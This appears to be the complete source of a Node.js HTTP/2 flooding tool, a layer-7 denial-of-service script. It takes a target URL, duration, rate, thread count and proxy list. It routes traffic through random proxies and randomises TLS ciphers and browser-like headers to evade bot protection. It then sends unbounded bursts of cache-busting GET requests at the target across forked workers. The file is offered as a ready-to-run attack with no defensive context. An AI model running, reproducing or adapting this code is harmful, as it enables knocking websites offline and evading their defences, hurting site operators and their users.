const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  ],
  
  userAgentList = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
];

  cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
  ]
language_header = [
    'fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en;q=0.5',
    'en;q=0.9',
    'de;q=0.7',
    'da;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl;q=0.9',
    'nn;q=0.9',
    'or;q=0.9',
    'pa;q=0.9',
    'pl;q=0.9',
    'pt;q=0.9',
    'pt;q=0.9',
    'ro;q=0.9',
    'ru;q=0.9',
    'si;q=0.9',
    'sk;q=0.9',
    'sl;q=0.9',
    'sq;q=0.9',
    'sr;q=0.9',
    'sr;q=0.9',
    'sv;q=0.9',
    'sw;q=0.9',
    'ta;q=0.9',
    'te;q=0.9',
    'th;q=0.9',
    'tr;q=0.9',
    'uk;q=0.9',
    'ur;q=0.9',
    'uz;q=0.9',
    'vi;q=0.9',
    'zh;q=0.9',
    'zh;q=0.9',
    'zh;q=0.9',
    'am;q=0.8',
    'as;q=0.8',
    'az;q=0.8',
    'bn;q=0.8',
    'bs;q=0.8',
    'bs;q=0.8',
    'dz;q=0.8',
    'fil;q=0.8',
    'fr;q=0.8',
    'fr;q=0.8',
    'fr;q=0.8',
    'fr;q=0.8',
    'gsw;q=0.8',
    'ha;q=0.8',
    'hr;q=0.8',
    'ig;q=0.8',
    'ii;q=0.8',
    'is;q=0.8',
    'jv;q=0.8',
    'ka;q=0.8',
    'kkj;q=0.8',
    'kl;q=0.8',
    'km;q=0.8',
    'kok;q=0.8',
    'ks;q=0.8',
    'lb;q=0.8',
    'ln;q=0.8',
    'mn;q=0.8',
    'mr;q=0.8',
    'ms;q=0.8',
    'mt;q=0.8',
    'mua;q=0.8',
    'nds;q=0.8',
    'ne;q=0.8',
    'nso;q=0.8',
    'oc;q=0.8',
    'pa;q=0.8',
    'ps;q=0.8',
    'quz;q=0.8',
    'quz;q=0.8',
    'quz;q=0.8',
    'rm;q=0.8',
    'rw;q=0.8',
    'sd;q=0.8',
    'se;q=0.8',
    'si;q=0.8',
    'smn;q=0.8',
    'sms;q=0.8',
    'syr;q=0.8',
    'tg;q=0.8',
    'ti;q=0.8',
    'tk;q=0.8',
    'tn;q=0.8',
    'ug;q=0.8',
    'uz;q=0.8',
    've;q=0.8',
    'wo;q=0.8',
    'xh;q=0.8',
    'yo;q=0.8',
    'zgh;q=0.8',
    'zu;q=0.8',
];
  const fetch_site = [
    "same-origin"
    , "same-site"
    , "cross-site"
    , "none"
  ];
  const fetch_mode = [
    "navigate"
    , "same-origin"
    , "no-cors"
    , "cors"
  , ];
  const fetch_dest = [
    "document"
    , "sharedworker"
    , "subresource"
    , "unknown"
    , "worker", ];
    
    const cplist = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_CBC_SHA",
    "TLS_RSA_WITH_AES_256_CBC_SHA"
];
 const cipher = cplist[Math.floor(Math.random() * cplist.length)];
  process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
]
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};

 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };

 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
    process.stdout.write("Loading: 10%\n".blue);
setTimeout(() => {
  process.stdout.write("\rLoading: 50%\n".blue);
}, 500 * process.argv[3] );

setTimeout(() => {
  process.stdout.write("\rLoading: 100%\n".blue);
}, process.argv[3] * 1000);
        cluster.fork();

    }
} else {for (let i = 0; i < args.Rate; i++) 
    { setInterval(runFlooder) }}


 class NetSocket {
     constructor(){}

  HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


 const Socker = new NetSocket();

 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  function randstra(length) {
const characters = "0123456789";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}

 function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";

    const nm = [
      "110.0.0.0",
      "111.0.0.0",
      "112.0.0.0",
      "113.0.0.0",
      "114.0.0.0",
      "115.0.0.0",
      "116.0.0.0",
      "117.0.0.0",
      "118.0.0.0",
      "119.0.0.0",
      ];
      const nmx = [
      "120.0",
      "119.0",
      "118.0",
      "117.0",
      "116.0",
      "115.0",
      "114.0",
      "113.0",
      "112.0",
      "111.0",
      ];
      const nmx1 = [
      "105.0.0.0",
      "104.0.0.0",
      "103.0.0.0",
      "102.0.0.0",
      "101.0.0.0",
      "100.0.0.0",
      "99.0.0.0",
      "98.0.0.0",
      "97.0.0.0",
      ];
      const sysos = [
      "Windows 1.01",
      "Windows 1.02",
      "Windows 1.03",
      "Windows 1.04",
      "Windows 2.01",
      "Windows 3.0",
      "Windows NT 3.1",
      "Windows NT 3.5",
      "Windows 95",
      "Windows 98",
      "Windows 2006",
      "Windows NT 4.0",
      "Windows 95 Edition",
      "Windows 98 Edition",
      "Windows Me",
      "Windows Business",
      "Windows XP",
      "Windows 7",
      "Windows 8",
      "Windows 10 version 1507",
      "Windows 10 version 1511",
      "Windows 10 version 1607",
      "Windows 10 version 1703",
      ];
      const winarch = [
      "x86-16",
      "x86-16, IA32",
      "IA-32",
      "IA-32, Alpha, MIPS",
      "IA-32, Alpha, MIPS, PowerPC",
      "Itanium",
      "x86_64",
      "IA-32, x86-64",
      "IA-32, x86-64, ARM64",
      "x86-64, ARM64",
      "ARMv4, MIPS, SH-3",
      "ARMv4",
      "ARMv5",
      "ARMv7",
      "IA-32, x86-64, Itanium",
      "IA-32, x86-64, Itanium",
      "x86-64, Itanium",
      ];
      const winch = [
      "2012 R2",
      "2019 R2",
      "2012 R2 Datacenter",
      "Server Blue",
      "Longhorn Server",
      "Whistler Server",
      "Shell Release",
      "Daytona",
      "Razzle",
      "HPC 2008",
      ];
      
      var randomUserAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];
       var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
       var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
       var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
       var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
       var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
       var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
        const rd = [
          "221988",
          "1287172",
          "87238723",
          "8737283",
          "8238232",
          "63535464",
          "121212",
        ];
         var kha = rd[Math.floor(Math.floor(Math.random() * rd.length))];
         
  encoding_header = [
    'gzip, deflate, br'
    , 'compress, gzip'
    , 'deflate, gzip'
    , 'gzip, identity'
  ];
  function randstrr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
 const val = { 'NEl': JSON.stringify({
			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
			"include_subdomains": Math.random() < 0.5 ? true : false}),
            }
            

     const rateHeaders = [
        {"accept" :accept_header[Math.floor(Math.random() * accept_header.length)]},
        {"Access-Control-Request-Method": "GET"},
        { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
        { "origin": "https://" + parsedTarget.host},
        { "source-ip": randstr(5)  },
        //{"x-aspnet-version" : randstrsValue},
        {"NEL" : val},
        { "A-IM": "Feed" },
        {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
       {'Delta-Base' : '12340001'},
       {"te": "trailers"},
       {"accept-language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3"},
        { "data-return" :"false"},
];
let headers = {
  ":authority": parsedTarget.host,
  ":scheme": "https",
  ":path": parsedTarget.path + "?" + generateRandomString(3, 8) + "=" + generateRandomString(10, 25),
  ":method": "GET",
  "upgrade-insecure-requests": "1",
  "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
  "accept-language": "en-US,en;q=0.9",
  "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
  "sec-fetch-user": "?1",
  "user-agent": userAgentList[Math.floor(Math.random() * userAgentList.length)],
  "referer": parsedTarget.protocol + "//" + parsedTarget.host + "/",
  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "connection": "keep-alive",
};

 const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     address: parsedTarget.host + ":443",
     timeout: 10
 };
 Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return;

    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)

    const settings = {
       enablePush: false,
       initialWindowSize: 15564991,
   };



    const tlsOptions = {
       port: parsedPort,
       secure: true,
       ALPNProtocols: ["h2", "http/1.1"],
       ciphers: cipher,
       sigalgs: sigalgs,
       requestCert: true,
       socket: connection,
       ecdhCurve: ecdhCurve,
       honorCipherOrder: false,
       rejectUnauthorized: false,
       secureOptions: secureOptions,
       secureContext :secureContext,
       host : parsedTarget.host,
       servername: parsedTarget.host,
       secureProtocol: secureProtocol
   };
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      settings: {
     headerTableSize: 65536,
     initialWindowSize: 6291456,
     maxFrameSize: 16384,
   },
      createConnection: () => tlsConn,
      socket: connection,
  });

  client.settings({
     headerTableSize: 65536,
     initialWindowSize: 6291456,
     maxFrameSize: 16384,
   });

client.setMaxListeners(0);
client.settings(settings);
    client.on("connect", () => {
       const IntervalAttack = setInterval(() => {
           for (let i = 0; i < args.Rate; i++) {

            const dynHeaders = {
              ...headers,
              ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
            }


const request = client.request({
      ...dynHeaders,
    }, {
      parent:0,
      exclusive: true,
      weight: 241,
    })
               .on('response', response => {
                   request.close();
                   request.destroy();
                  return
               });
               request.end();
           }
       }, 500);
    });
    client.on("close", () => {
      client.destroy();
      connection.destroy();
      return
  });

  client.on("error", error => {
client.destroy();
connection.destroy();
return
});
});
}
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
